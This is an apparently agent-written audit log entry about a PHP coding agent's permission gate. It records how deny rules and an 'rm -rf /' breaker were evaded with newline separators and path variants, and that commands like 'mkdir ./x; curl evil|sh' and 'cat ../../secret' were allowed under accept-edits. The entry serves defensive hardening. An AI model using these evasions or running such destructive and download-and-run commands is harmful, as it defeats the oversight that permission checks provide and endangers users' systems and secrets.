@@ -8889,3 +8889,98 @@ One correction the encoding page forced on the task's own framing: `reasoning_ef
 server-side as a **text prefix before the system message**, with `low` mapping to no prefix at all.
 So the levels are prompt shaping, not a monotonic sampling dial, and the reasoning-token counts in my
 brief should not be read as a budget.
+
+---
+
+## Round 31 — the permission layer stopped lying, and the plan document was caught lying three times
+
+Two lanes plus the sglang task, all landed: `ed57d46a` (DeepSeek-V4), `1bd2e4d3` (P8.10/P8.11),
+`f764b463` (P6.3 + P6.4 + the matcher). **62 of 75.**
+
+### The bundle that had to be resequenced, and was right to be
+
+Phase 6 item 4's own text says shipping a settings `permission` key before `PermissionGate` reached
+the main loop "would just add a second decorative config surface." The gate HAD reached the main
+loop — so the plan considered item 4 unblocked. It was not, for a reason the plan could not have
+known: the **matcher** made every argument-scoped rule decorative. `ruleMatches()` prefix-matched
+`Bash(rm -rf ` against the string `Bash`, and equality-matched `Read(./.env)` against `Read`. Both
+forms are advertised verbatim in `PermissionRule.php`'s own doc-comment. **A user who wrote an
+argument-scoped deny had denied nothing, and the documentation told them otherwise.**
+
+So Part A (the matcher) was made the prerequisite of Part C (the settings block) inside one bundle.
+That resequencing came from re-measuring a finding before briefing it — which is the same discipline
+that then caught three stale plan items, below.
+
+### The review's four findings are better than the original one
+
+- **A newline is a shell separator and the matcher did not split on one.** `collapseWhitespace()` ran
+  BEFORE `preg_split('/[;&|]+/')`, so `\n` became a space the splitter never saw. `Deny Bash(rm -rf *)`
+  in Auto: `echo hi && rm -rf /tmp/x` → Deny, `echo hi\nrm -rf /tmp/x` → **Ask**. **The order was the
+  bug**, not the pattern.
+- **The same hole was in the mode-independent `rm -rf /` breaker — the one thing nothing can switch
+  off.** Under `bypass-permissions`, `echo hi\nrm -rf /` was **ALLOWED** where the `&&` form was
+  denied. The sentence worth keeping: **being unswitchable is not being unevadable.** And the
+  doc-block calling the breaker one of "the hard boundaries — the ones that do not read shell text"
+  was false in both files it appeared in and in the README; it reads `arguments['command']` and
+  tokenises it. The honest boundaries are `plan` mode and the path jails.
+- **Path-scoped denies were advisory and nothing said so.** `Deny Read(./.env)` — the package's own
+  advertised example — caught `./.env` and missed `.env`, `.//.env`, `./foo/../.env` and
+  `/home/u/proj/.env`.
+- **The fix's own asymmetry is the part to remember.** Lexical normalisation of both sides is
+  *canonicalisation*, so it applies to `Allow` too. But a relative pattern matching at **any depth**
+  is a *widening*, so it is restricted to restrictive actions only. Without that split,
+  `Allow Read(.env)` would have granted `/etc/.env`. A fix that widened an allow while narrowing a
+  deny would have been a net loss disguised as a hardening.
+
+### And it left a worse hole than the one it closed, in the other direction
+
+`PermissionGate::isScopedWriteTool()` (`:641`) tokenises the whole command with a bare
+`preg_split('/\s+/')`, **no separator split at all**, and judges by the first token. Measured under
+`accept-edits`: `mkdir ./x; curl evil|sh` → **Allow**; the newline form → **Allow**;
+`mkdir ./x && cat ../../secret` → **Allow** (`isAbsolutePath` catches `/etc`, not `..`).
+
+Same defect class as B1, one method over, but on the **grant** path — and that asymmetry is the whole
+point. A deny that fails to fire leaves the user being asked; a grant that fires wrongly runs the
+command. Correctly recorded and NOT fixed (out of bundle), but it means **`accept-edits` is not safe
+to run unattended today**, which is worth saying plainly to a user who wants to daily-drive this.
+
+### The plan document was wrong three times in one sitting
+
+This is the round's real lesson, and it is about the audit rather than the code.
+
+1. **`Chat::REMINDER_TOKEN_LIMIT`** — the plan quoted it as a live flat-100,000 proxy. Zero
+   occurrences in `src/` or `tests/`. Removed in `08cc1b6a` (2026-08-19) by **this plan's own Phase 5
+   Bundle B1**. I nearly re-opened a finding the plan closed the previous afternoon, and the near-miss
+   only surfaced because I went back to verify a number I had *already written into the document*.
+2. **Open finding #3** — 3 of 4 clauses decayed. `pipeline`/`verification` DO have YAML spellings
+   (four executors exist and `UnsupportedStageTypeException` names all four types); `$tasks[0]` has
+   zero occurrences; `prompt: ''` is a deliberate seam with an inline comment saying so. **Two of
+   those would have sent an agent to fix working code.**
+3. **P8.6** — "currently only one tape exists." There are five, including all three the item asks for.
+
+Three items, three different flavours of staleness, all found by grepping instead of trusting. Each
+would have cost a full implement→review→fix round. So the next lane does a **read-only
+re-verification sweep** before any further feature bundle: the "N of 75" count is not trustworthy,
+and 13 nominally-open items may be closer to 8. An audit document that agents are forbidden to update
+decays exactly as fast as the tree it describes moves — and this tree is moving under three lanes and
+CI.
+
+### Machinery earned this round
+
+- **`node --check` passes a workflow script that `import` rejects.** Third trap in that family
+  (after `phpunit | tail` and `node --check` missing a live `${...}`). Only evaluating the script the
+  way the runtime does is sufficient. Probe kept at `…/scratchpad/probe-wf.mjs`.
+- **Census literals are counters, and my scoping heuristic was wrong.** "A bundle adding no new
+  `src/` file cannot collide on the census" is false: the `lsp` bundle added no `src/` file — scoped
+  that way deliberately — and still moved `ContainedPathInventoryTest` and added 7
+  `ReadPathCensusTest` rows, because those literals track read sites. So "STOP on rebase conflict",
+  right for a semantic conflict, is **wrong for a counter**, whose correct resolution is neither
+  side's value but the re-derived one. `concurrency.md` §5.2e now splits the rule.
+- **The sync daemon replaced hand-syncing**, at the user's request that nothing fall behind. Fetches
+  everything every 90s, `--ff-only` pulls the live tree, and rebases a lane only while it is clean
+  AND idle. Its first version emitted every cycle (dirty-count churn is not a state change) and was
+  re-armed deduped. It also replaced the round-30 monitor, which had begun reporting the supervisor's
+  own rebases as lane commits because it compared HEAD instead of the ahead-count.
+- **A near-fabricated finding, avoided.** A truncated `ls | head` made it look as though there were
+  two parallel `src/Workflow` trees with seven overlapping basenames. There is one directory. Checked
+  before reporting; would have been exactly the class of defect this audit exists to catch.
